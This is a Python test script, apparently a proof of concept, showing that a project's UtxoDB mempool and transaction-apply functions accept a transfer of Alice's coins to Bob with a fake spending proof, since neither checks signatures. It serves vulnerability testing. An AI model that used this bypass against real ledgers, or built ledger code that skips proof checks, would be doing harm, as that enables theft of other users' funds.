import sqlite3
import json
import hashlib
import time
from node.utxo_db import UtxoDB, UNIT

def test_utxo_mempool_bypass():
    db_path = "test_utxo.db"
    db = UtxoDB(db_path)
    db.init_tables()
    
    # 1. Create a valid box
    box = {
        'box_id': 'a' * 64,
        'value_nrtc': 1000 * UNIT,
        'proposition': '0008' + 'Alice'.encode().hex(),
        'owner_address': 'Alice',
        'creation_height': 1,
        'transaction_id': 'b' * 64,
        'output_index': 0
    }
    db.add_box(box)
    
    print(f"Box created: {box['box_id']}")
    
    # 2. Attempt to add a tx to mempool that spends this box 
    # but we omit the spending_proof (which the DB doesn't check anyway).
    # The mempool_add check should pass because it only checks if the box exists and is unspent.
    tx = {
        'tx_id': 'c' * 64,
        'tx_type': 'transfer',
        'inputs': [{'box_id': box['box_id'], 'spending_proof': 'FAKE_PROOF'}],
        'outputs': [{'address': 'Bob', 'value_nrtc': 999 * UNIT}],
        'fee_nrtc': 1 * UNIT,
        'timestamp': int(time.time())
    }
    
    result = db.mempool_add(tx)
    print(f"Mempool add result: {result}")
    
    # 3. Now we try to APPLY the transaction.
    # The apply_transaction method also DOES NOT verify spending_proof.
    # It only checks if inputs are unspent.
    apply_result = db.apply_transaction(tx, block_height=2)
    print(f"Apply transaction result: {apply_result}")
    
    # 4. Check if Bob got the money
    bob_balance = db.get_balance('Bob')
    print(f"Bob balance: {bob_balance}")
    
    if apply_result and bob_balance == 999 * UNIT:
        print("CRITICAL VULNERABILITY FOUND: UTXO spent without signature verification!")
    else:
        print("No vulnerability found.")

if __name__ == "__main__":
    test_utxo_mempool_bypass()
